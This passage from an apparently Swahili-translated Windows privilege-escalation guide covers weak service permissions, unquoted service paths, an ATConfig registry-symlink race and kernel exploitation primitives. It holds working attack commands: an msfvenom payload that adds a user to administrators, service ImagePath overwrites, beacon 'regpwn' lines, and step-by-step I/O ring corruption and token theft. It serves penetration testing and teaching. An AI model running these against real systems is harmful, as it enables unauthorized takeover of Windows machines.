- **WRITE_DAC**: Huruhusu kubadilisha usanidi wa ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kubadilisha usanidi wa ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye upendeleo, lakini **watumiaji wenye upendeleo mdogo wanaweza kurekebisha EXE ya service au folda yake mama**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuwasha upya service**.

**Angalia ikiwa unaweza kurekebisha binary inayoendeshwa na service** au ikiwa una **ruhusa za kuandika kwenye folda** ambamo binary hiyo ipo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binary zote zinazoendeshwa na service ukitumia **wmic** (si katika system32) na kuangalia ruhusa zako ukitumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au directory inayoihifadhi. Mfuatano wa vitendo wa kutumia udhaifu huo ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya service yenye nia hasidi.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri kuwasha upya kwa mfumo / kichochezi cha service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa hujiendesha kiotomatiki wakati wa boot, ina hatua ya hitilafu inayoizindua tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia kama unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la ruhusa la awali lilielezwa hivi:

Inapaswa kuchunguzwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye ufunguo maalum wa service. Ingizo la ACL pekee halithibitishi ufikiaji unaotumika: ingizo za deny, tokeni ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za ufunguo wa registry ni tofauti na haki za `SERVICE_CHANGE_CONFIG` na `SERVICE_START` za service object. Escalation pia inahitaji sehemu inayoweza kutumika katika usanidi wa service, njia ya kuiwasha service na utambulisho wa service wenye ruhusa za juu zaidi. Angalia [haki za ufunguo wa registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [marejeo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya Microsoft.

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mbio za symbolic link za registry zinazosababisha uandishi wa thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa kipindi wa HKLM. Mbio za **symbolic link** za registry zinaweza kuelekeza upya uandishi huo wenye upendeleo hadi **njia yoyote ya HKLM**, na kutoa uwezo wa kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Mahali pa funguo (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop, na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure-desktop (kwa mfano, **LockWorkstation**), ambako huanzisha mtiririko wa AT broker.
3. **Shinda mbio** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengwa la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa upya.

Ukishapata uwezo wa kuandika thamani yoyote ya HKLM, geukia LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuianzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya uandishi. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya mbio.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub-registries kutoka kwenye hii**. Kwa huduma za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa njia ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu ya njia inayoishia kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_, Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa ndani ya alama za kunukuu, ukiondoa zile zinazohusiana na huduma zilizojengewa ndani ya Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na ku-exploit** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe binary ya service kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda ikawezekana kupandisha marupurupu. Maelezo zaidi yanapatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Malengo ya script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **argumenti za action** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa argumenti ya faili iliyo wazi ya interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigeu, masharti na uunganishaji wa amri za shell vinahitaji kufuatiliwa kwa mikono. Script au saraka yake kuu inayoweza kuandikwa na mtumiaji anayepiga simu ni dalili ya uwezekano wa utekelezaji kati ya akaunti tofauti tu ikiwa principal ya task iliyosanidiwa ni tofauti na ya mtumiaji huyo, na task inafikia action hiyo. ACL inayoruhusu kuongeza pekee inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, trigger na sera ya udhibiti wa programu kabla ya kudai kuwa kuna upandishaji wa marupurupu. Orodhesha bila kurekebisha script au kuanzisha task.

## Named streams kwenye faili zinazofikika

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya nakala rudufu au faili za usanidi zinazofikika, kagua **majina na ukubwa** wa stream kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa kuna siri ni dalili tu. Kagua ruhusa halisi za kusoma faili, uwezo wa filesystem kutumia streams, kama stream ina credentials zinazoweza kutumika, na akaunti ambazo credentials hizo huithibitisha kwa kweli. Epuka kuchanganua streams kwa kujirudia au kuchapisha maudhui ya streams wakati wa uorodheshaji wa kawaida.

## Ingizo za helper za Windows Driver Kit zinazoratibiwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, inayoweza kutumia faili za `command.txt`, `reboot.rsf` na `working\rsf.rsf` ya mradi kutoka kwenye saraka yake ya uendeshaji. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye marupurupu inaweza kutumia ruhusa za kuandika za kiwango cha chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye marupurupu anayetumia faili hizo, na kwamba faili **zote mbili** za pembeni zinaweza kuundwa au kurekebishwa; kupata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia za faili hizo mbili za pembeni. Ikiwa task haibainishi saraka ya kufanya kazi, saraka ya executable ni dalili tu ya kufuatilia, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya kufanya kazi ya mradi pia lazima litimizwe. Kagua principal halisi ya task badala ya kudhani inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha mojawapo na kupandisha marupurupu) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Windows agent ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri Windows agent za zamani za Checkmk ambazo ziliandika faili za amri katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwapo awali na iliyolindwa dhidi ya uandishi, baada ya jaribio la kuibadilisha kushindikana. Muuzaji alirekebisha tatizo hilo katika 2.1.0p40, 2.2.0p23, 2.3.0b1 na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama utendakazi wa agent ulioathiriwa unaweza kutekelezwa; lebo ya tawi pekee, kama `2.1`, haiwezi kuthibitisha kuwa mfumo umeathirika. Ukusanyaji wa taarifa unaweza kukagua toleo, hali ya service na ruhusa za Temp bila kuunda faili au kuanzisha amri za agent.

#### Ukaguzi wa service ya SAML ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri build 6210 na matoleo ya awali ya ADSelfService Plus; muuzaji alirekebisha tatizo hilo katika build 6211. Inahusika tu ikiwa SAML SSO **imewashwa au iliwahi kuwashwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni dalili ya kufuatilia, si uthibitisho wa uwepo wa athari: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao na akaunti inayoendesha service hiyo. Utekelezaji wa code kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji mfano wa service unaoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni dalili tofauti ya backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa ukusanyaji wa kawaida wa taarifa.

#### Mipaka ya Jenkins controller na akaunti za domain

Kwenye Jenkins controller ya Windows, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiendesha: [Jenkins documents these as separate `Job/Create`, `Job/Configure`, and `Job/Build` rights](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au kichochezi cha mbali kinaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa kimewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi taarifa za credential na funguo za usimbaji fiche katika `credentials.xml`, `secrets/hudson.util.Secret` na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri katika matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa njia ya script inaweza kuandikika na kuna logon halisi au consumer iliyoratibiwa inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji uthibitishaji tofauti wa ruhusa halisi za AD.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga kwenye foleni** na kutumia agent pool iliyochaguliwa; [Microsoft documents pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa ndogo inaweza kuwasilisha hatua ya script na kuendesha pipeline hiyo kwenye Windows agent inayosimamiwa na mtumiaji, hatua hiyo hutekelezwa kama [agent's configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa na utambulisho wa service ya agent kabla ya kudai kuwa kuna mpito kati ya watumiaji au hadi SYSTEM. Agent iliyosakinishwa, role ya mradi au ruhusa ya kuandika kwenye repository ni dalili tu; kagua ruhusa na metadata ya service ya ndani bila kuanzisha build wakati wa ukusanyaji wa taarifa usioingilia mfumo.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft distinguishes](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) kati ya **akaunti ya service ya ADSync**, inayoendesha service ya usawazishaji na kufikia database yake ya SQL, na **akaunti ya AD DS connector**, ambayo ruhusa zake za directory hutegemea vipengele vya usawazishaji vilivyosaniwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa kwa njia fiche katika database hiyo, huku taarifa za ufunguo [protected by DPAPI under the ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Kuwepo kwa service ya usawazishaji iliyosakinishwa, group la ndani lenye jina linaloashiria admin, au uwezo wa kuona database pekee hakuthibitishi kuwa credential inaweza kufichuliwa kwa kusimbuliwa au kwamba kuna njia ya kupandisha ruhusa katika domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa akaunti ya service na ufunguo, muundo wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa na ruhusa halisi za utambulisho huo katika AD. Ukusanyaji wa kawaida wa taarifa unapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za support DLL za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi support DLL katika `C:\ProgramData` na kuzipakia katika print process yenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, pamoja na saraka mama na reparse point, hata kama ruhusa za kuorodhesha printer kupitia WMI zimekataliwa. Kwa [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [the original disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) inaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni dalili tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia maingizo ya deny, kuwa driver husika imesakinishwa na inapakia faili hiyo ikiwa na utambulisho wenye ruhusa za juu, na kama driver iliyosasishwa ya muuzaji au programu ya usalama imerekebisha usakinishaji huo. Usihitimishe kuwa kuna athari kutokana na jina la saraka au toleo la driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha faili fulani ya config ili kusoma faili maalum, au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu kwenye folda/faili za mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake za `plugins`. Ikiwa kuna usakinishaji wa portable/copy unaoweza kuandikwa, kuweka plugin hasidi husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza kubadilisha registry au binary fulani itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva yanayoweza kuwa **ya ajabu au yaliyo hatarini**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika vishughulikiaji vya IOCTL vilivyoundwa vibaya), unaweza kupata haki za juu kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na unyonyaji wa kernel ya Windows:

Kwa hali ya kernel-mode ring-buffer yenye rejista za kusoma/kuandika zinazoweza kuandikwa na mtumiaji, tazama [lahaja ya USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa hitilafu za race condition ambapo simu iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambulizi, kuchelewesha utafutaji kimakusudi (kwa kutumia vijenzi vyenye urefu wa juu zaidi au minyororo mirefu ya saraka) kunaweza kurefusha dirisha kutoka mikrosekunde hadi makumi ya mikrosekunde:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, ufichuaji wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kutokana na hitilafu mbili ambazo kila moja ni dhaifu kivyake: **race condition ya muda wa maisha wa cancel-safe queue** inayofungua request/CBD wakati lock ya queue bado imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovujisha allocation ya paged-pool iliyofunguliwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na unyonyaji:

- **Kufungua chini ya lock + cancel baadaye**: tafuta njia ya mafanikio inayotekeleza **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikitekeleza **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio itafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofunguliwa kwa callback ya uondoaji ya driver.
- **Tumia upya object ya queue iliyofunguliwa** kwa allocation ya paged-pool yenye ukubwa sawa na inayodhibitiwa na mshambulizi. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na unaweza kuvichunguza baadaye kwa operesheni za kusoma/kuchungulia pipe. Ikiwa object iliyofunguliwa ina viungo vya orodha, vibadilishe viwe **orodha ya mzunguko ya nodi bandia za request kwenye kumbukumbu ya mtumiaji** ili driver iendelee kuchakata miundo ya request inayofafanuliwa na mshambulizi badala ya kusimama kwenye kichwa asilia cha orodha.
- **Boresha uandishi unaotabirika**: ikiwa request bandia inaelekeza upya pointer ya muktadha iliyopachikwa inayotumiwa na uandishi wa bookkeeping (mihuri ya muda / QPC / sehemu zilizo karibu na refcount), unaweza kupata uandishi wa kernel **unaodhibiti anwani lakini si thamani**. Katika hali hiyo, lenga sehemu ya **urefu/ukubwa** ya object ya pool iliyosambazwa badala ya pointer ya mwisho ya code/data, kisha chunguza objects zilizosambazwa hadi ile iliyoharibika ikuruhusu kusoma nje ya mipaka ya paged-pool.
- **Muundo wa ufichuaji unaoweza kushindanishwa kwa race**: syscall yoyote inayotekeleza `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` inafaa kuchunguzwa kwa makini. Uaminifu huongezeka ikiwa mshambulizi anaweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano kwa kuongeza maingizo mengi ya orodha/rasilimali yanayoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu nakala ndefu zaidi hupanua dirisha la kubadilisha bila kulazimika kuangusha mashine.
- **Malengo ya refill yenye pointer nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya ufichuaji kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambulizi (`8 * regBufferCnt`), na kila kipengele ni pointer ya kernel kuelekea `_IOP_MC_BUFFER_ENTRY`. Vujisha mojawapo ya arrays hizi, pata `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili operesheni zinazofuata za I/O ring zitumie maingizo yaliyoghushiwa na mshambulizi na kutoa usomaji/uandishi kiholela wa kernel. Ikiwa uandishi pekee unaopatikana unatoa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **uandishi unaopishana usiolingana** kuunda pointer ya mtumiaji yenye byte inayojirudia kama `0x0101010101010101`, ipangie kumbukumbu kwa `VirtualAlloc`, kisha weka humo array ya registered-buffer iliyoghushiwa.<sup>[[30]](#references)</sup>

Viashiria muhimu vya utatuzi:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu upate usomaji/uandishi holela wa kernel kupitia I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya baada ya primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za uharibifu wa kumbukumbu wa registry hive

Athari za kisasa za hive hukuruhusu kupanga mpangilio unaotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha uharibifu wa metadata kuwa buffer overflow za kernel paged-pool bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Kuchanganyikiwa kwa aina katika direct-mode ya `RtlQueryRegistryValues` kutokana na paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hupokea registry path kutoka userland, hukagua tu kwamba ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` kuelekeza kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii huunda primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya `\Registry\...` ya absolute inayodhibitiwa na mtumiaji huruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hakuweza kufikia moja kwa moja.
